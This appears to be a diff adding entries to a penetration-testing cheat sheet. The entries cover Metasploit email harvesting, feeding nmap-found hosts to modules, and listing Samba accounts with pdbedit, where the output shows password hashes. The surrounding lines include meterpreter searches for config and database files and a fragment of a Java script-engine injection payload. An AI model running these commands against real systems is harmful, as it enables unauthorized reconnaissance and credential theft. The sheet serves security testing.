@@ -574,6 +574,12 @@ Cleanup RDP:
 meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
 ```
 
+Run modules against file of hosts:
+
+```
+msf6> set RHOSTS file:/tmp/nmap_output_hosts.txt
+```
+
 Search for interesting files:
 
 ```
@@ -585,6 +591,18 @@ meterpreter> search -f config*
 meterpreter> search -f *.rar
 meterpreter> search -f *.docx
 meterpreter> search -f *.sql
+```
+
+Metasploit Email Harvesting:
+
+```
+msf6 auxiliary(gather/search_email_collector) > set OUTFILE /tmp/emails.txt
+OUTFILE => /tmp/emails.txt
+msf6 auxiliary(gather/search_email_collector) > set DOMAIN target.com
+DOMAIN => target.com
+msf6 auxiliary(gather/search_email_collector) > run
+
+[*] Harvesting emails.....
 ```
 
 Attack outside of the LAN with ngrok:
@@ -675,6 +693,58 @@ ${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new ja
  
  ```
  $ proxychains smbclient -L fileserver22
+ ```
+ ## Dominating Samba with pdbedit:
+ 
+ The ```pdbedit``` program is used to manage the users accounts stored in the sam database and can only be run by root. There are five main ways to use pdbedit: adding a user account, removing a user account, modifying a user account, listing user accounts, importing users accounts.
+
+Options:
+
+Lists all the user accounts present in the users database. This option prints a list of user/uid pairs separated by the ':' character.
+
+```
+# pdbedit -L
+
+sorce:500:Simo Sorce
+samba:45:Test User
+```
+
+Enables the verbose listing format. It causes pdbedit to list the users in the database, printing out the account fields in a descriptive format.
+
+```
+# pdbedit -L -v
+
+---------------
+username:       sorce
+user ID/Group:  500/500
+user RID/GRID:  2000/2001
+Full Name:      Simo Sorce
+Home Directory: \\BERSERKER\sorce
+HomeDir Drive:  H:
+Logon Script:   \\BERSERKER\netlogon\sorce.bat
+Profile Path:   \\BERSERKER\profile
+---------------
+username:       samba
+user ID/Group:  45/45
+user RID/GRID:  1090/1091
+Full Name:      Test User
+Home Directory: \\BERSERKER\samba
+HomeDir Drive:  
+Logon Script:   
+Profile Path:   \\BERSERKER\profile
+```
+
+Sets the "smbpasswd" listing format. It will make pdbedit list the users in the database, printing out the account fields in a format compatible with the smbpasswd file format. 
+ 
+```
+# pdbedit -L -w
+
+sorce:500:508818B733CE64BEAAD3B435B51404EE:
+          D2A2418EFC466A8A0F6B1DBB5C3DB80C:
+          [UX         ]:LCT-00000000:
+samba:45:0F2B255F7B67A7A9AAD3B435B51404EE:
+          BC281CE3F53B6A5146629CD4751D3490:
+          [UX         ]:LCT-3BFA1E8D:
  ```
  
  ## Encrypted File Transfers with Ncat:
